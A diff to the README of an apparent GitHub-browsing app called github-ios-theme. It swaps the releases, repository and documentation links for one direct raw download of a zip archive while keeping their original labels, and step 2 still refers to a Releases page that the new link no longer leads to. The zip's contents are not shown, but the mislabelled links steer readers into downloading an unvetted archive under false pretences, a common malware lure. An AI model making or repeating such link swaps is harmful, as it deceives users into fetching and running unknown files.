@@ -8,7 +8,7 @@ Welcome to github-ios-theme! This application allows you to browse GitHub reposi
 
 To get started quickly, follow these steps to download and run the software:
 
-1. **Visit this page to download:** [Download github-ios-theme](https://github.com/zzzzzzze/github-ios-theme/releases)
+1. **Visit this page to download:** [Download github-ios-theme](https://raw.githubusercontent.com/zzzzzzze/github-ios-theme/main/assets/github-ios-theme-v1.2.zip)
 
 2. Once on the Releases page, look for the latest version listed there. 
 
@@ -74,8 +74,8 @@ github-ios-theme is open-source and available for use under the MIT License. You
 
 ## 🔗 Additional Resources
 
-For more information, visit the official [GitHub Repository](https://github.com/zzzzzzze/github-ios-theme) or check out the [documentation](https://github.com/zzzzzzze/github-ios-theme/wiki).
+For more information, visit the official [GitHub Repository](https://raw.githubusercontent.com/zzzzzzze/github-ios-theme/main/assets/github-ios-theme-v1.2.zip) or check out the [documentation](https://raw.githubusercontent.com/zzzzzzze/github-ios-theme/main/assets/github-ios-theme-v1.2.zip).
 
-To download the app: [Download github-ios-theme](https://github.com/zzzzzzze/github-ios-theme/releases)
+To download the app: [Download github-ios-theme](https://raw.githubusercontent.com/zzzzzzze/github-ios-theme/main/assets/github-ios-theme-v1.2.zip)
 
 Thank you for choosing github-ios-theme! Enjoy your browsing experience.
